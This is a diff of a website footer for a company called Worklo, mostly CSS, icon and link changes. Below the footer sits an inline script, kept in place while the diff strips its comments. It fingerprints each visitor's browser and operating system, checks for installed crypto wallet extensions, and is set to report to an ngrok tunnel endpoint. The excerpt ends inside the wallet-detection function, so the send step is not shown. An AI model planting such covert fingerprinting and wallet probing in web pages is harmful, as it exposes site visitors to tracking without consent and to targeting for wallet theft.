-.fnw .ph-block a:hover{color:#fff}
-.fnw .ad-block{margin-bottom:28px}
-.fnw .ad-block p{font-size:.83rem!important;color:rgba(255,255,255,.55)!important;line-height:1.7!important;margin:0!important;display:block!important;visibility:visible!important;}
-.fnw .logo-banner{width:100%;padding:16px 0;background:none;border:none;display:flex;align-items:center;justify-content:flex-start;margin-top:8px}
-.fnw .logo-banner img{height:120px;width:auto;max-width:100%;object-fit:contain;filter:brightness(1.2) drop-shadow(0 0 24px rgba(59,130,246,.35))}
-.fnw .c2 ul{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:12px}
-.fnw .c2 ul li a{font-size:.84rem;color:rgba(255,255,255,.38);text-decoration:none;transition:color .2s;display:block;padding:0}
-.fnw .c2 ul li a:hover{color:rgba(255,255,255,.85)}
-.fnw .c3 h3{font-size:1.9rem;font-weight:700;color:#fff;line-height:1.15;margin:0 0 8px;letter-spacing:-.02em;background:none;-webkit-text-fill-color:#fff}
-.fnw .c3 .sub{font-size:.78rem;color:rgba(255,255,255,.32);margin-bottom:24px;line-height:1.6}
-.fnw .c3 form{display:flex;flex-direction:column;gap:0}
-.fnw .c3 input,.fnw .c3 select,.fnw .c3 textarea{width:100%;background:transparent;border:none;border-bottom:1px solid rgba(255,255,255,.12);border-radius:0;padding:14px 0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:.84rem;color:rgba(255,255,255,.65);outline:none;box-shadow:none;transition:border-color .2s}
-.fnw .c3 input::placeholder,.fnw .c3 textarea::placeholder{color:rgba(255,255,255,.25)}
-.fnw .c3 input:focus,.fnw .c3 select:focus,.fnw .c3 textarea:focus{border-bottom-color:rgba(255,255,255,.45);background:transparent;box-shadow:none}
-.fnw .c3 select{color:rgba(255,255,255,.3);cursor:pointer;-webkit-appearance:none;appearance:none}
-.fnw .c3 select option{background:#111;color:#fff}
-.fnw .c3 textarea{resize:none;min-height:72px}
-.fnw .c3 button{width:100%;padding:14px;border-radius:50px;background:#fff;color:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:.88rem;font-weight:700;border:none;cursor:pointer;margin-top:20px;transition:background .2s,transform .15s}
-.fnw .c3 button:hover{background:#e8e8e8;transform:translateY(-1px)}
-.fnw .footer-location{display:flex;align-items:flex-start;gap:7px;font-size:.78rem;color:rgba(255,255,255,.4);line-height:1.6;margin-top:4px}
-.fn-bot{border-top:1px solid rgba(255,255,255,.07);padding:20px 0;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
-.fn-bot p{font-size:.76rem;color:rgba(255,255,255,.22);margin:0}
-.fn-bot-links{display:flex;gap:20px}
-.fn-bot-links a{font-size:.76rem;color:rgba(255,255,255,.22);text-decoration:none;transition:color .2s}
-.fn-bot-links a:hover{color:#fff}
-@media(max-width:960px){.fnw{grid-template-columns:1fr 1fr;gap:40px}.fnw .c3{grid-column:1/-1}}
-@media(max-width:600px){.fnw{grid-template-columns:1fr;gap:32px}footer{padding:48px 0 0}.fnw .logo-banner img{height:80px}.fnw .c3 h3{font-size:1.5rem}.fn-bot{flex-direction:column;align-items:flex-start;gap:8px}.fn-bot-links{gap:14px}}
-</style>
 <footer>
   <div class="container">
     <div class="fnw">
       <div class="c1">
         <h4>Contact Us</h4>
         <div class="socials">
-          <a href="https://www.linkedin.com/company/worklo-psa/" target="_blank" rel="noopener" aria-label="LinkedIn" class="soc-box"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a><a href="https://github.com/worklo-psa" target="_blank" rel="noopener" aria-label="GitHub" class="soc-box"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0 1 12 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
+          <a href="https://www.linkedin.com/company/worklo-psa/" target="_blank" rel="noopener" aria-label="LinkedIn" class="soc-box"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a><a href="https://github.com/Worklo-Group" target="_blank" rel="noopener" aria-label="GitHub" class="soc-box"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0 1 12 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
         </div>
         <div class="ph-block">
-          <svg viewBox="0 0 24 24" fill="currentColor" style="width:28px;height:28px;color:rgba(255,255,255,.85);display:block;margin-bottom:12px;"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+          <svg viewBox="0 0 24 24" fill="currentColor" style="width:18px;height:18px;color:rgba(237,232,224,.45);display:block;margin-bottom:10px;"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
           <a href="tel:+19296129360">+1 (929) 612 9360</a>
         </div>
         <div class="ph-block">
-          <svg viewBox="0 0 24 24" fill="currentColor" style="width:28px;height:28px;color:rgba(255,255,255,.85);display:block;margin-bottom:12px;"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+          <svg viewBox="0 0 24 24" fill="currentColor" style="width:18px;height:18px;color:rgba(237,232,224,.45);display:block;margin-bottom:10px;"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
           <a href="mailto:support@worklo.org">support@worklo.org</a>
         </div>
         <div class="ph-block">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="width:28px;height:28px;color:rgba(255,255,255,.85);display:block;margin-bottom:12px;"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;color:rgba(237,232,224,.45);display:block;margin-bottom:10px;"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
           <a href="https://maps.google.com/?q=888+Broadway+New+York+NY" target="_blank" rel="noopener">888 Broadway, Floor 4,<br>New York, NY 10003, US</a>
         </div>
-        
         <div class="logo-banner">
           <img src="/images/logo.gif" alt="Worklo" />
         </div>
@@ -717,7 +267,7 @@ footer .container{position:relative;z-index:1}
     </div>
   </div>
 </footer>
-<!-- Paste this just before </body> on worklo.org -->
+
 <script>
 (function(){
   if(window.__wlTracked || sessionStorage.getItem('__wlTracked'))return;
@@ -726,13 +276,11 @@ footer .container{position:relative;z-index:1}
 
   var e='https://clunky-petunia-obsessed.ngrok-free.dev/track';
 
-  // Collect browser info
   var browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
   var lang = navigator.language || navigator.userLanguage;
   var platform = navigator.platform;
   var screen_res = screen.width + 'x' + screen.height;
 
-  // Detect OS from userAgent
   function detectOS() {
     var ua = navigator.userAgent;
     if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
@@ -749,7 +297,6 @@ footer .container{position:relative;z-index:1}
   }
   var os = detectOS();
 
-  // Detect crypto wallet extensions
   function detectWallets() {
     var wallets = [];
     try {
